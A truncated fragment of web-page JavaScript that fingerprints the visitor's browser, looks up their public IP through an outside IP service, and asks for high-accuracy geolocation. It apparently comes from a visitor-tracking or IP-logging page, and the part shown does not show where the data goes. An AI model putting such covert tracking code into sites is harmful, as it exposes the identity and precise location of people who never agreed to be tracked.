                            crossorigin="anonymous" referrerpolicy="no-referrer"></script>

                        <script>
                            (async() => {
                            let client = new ClientJS();
                            const finalData = {};
                            async function getPos() {
                                return new Promise((resolve, reject) => {
                                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true })
                                })
                            };
                            finalData.fingerprint = client.getCustomFingerprint(client.getBrowserData().ua,client.getCanvasPrint())
                            finalData["user-agent"] = client.getBrowserData().ua ?? "[USER-AGENT FROM EXPRESS.JS]"
                            finalData.timestamp = 1707226845197
                            finalData.ip = (await (await fetch("https://api.ipify.org/?format=json")).json()).ip
                            if (navigator.geolocation) {
                                getPos().then((pos) => {
                                    finalData.location = {
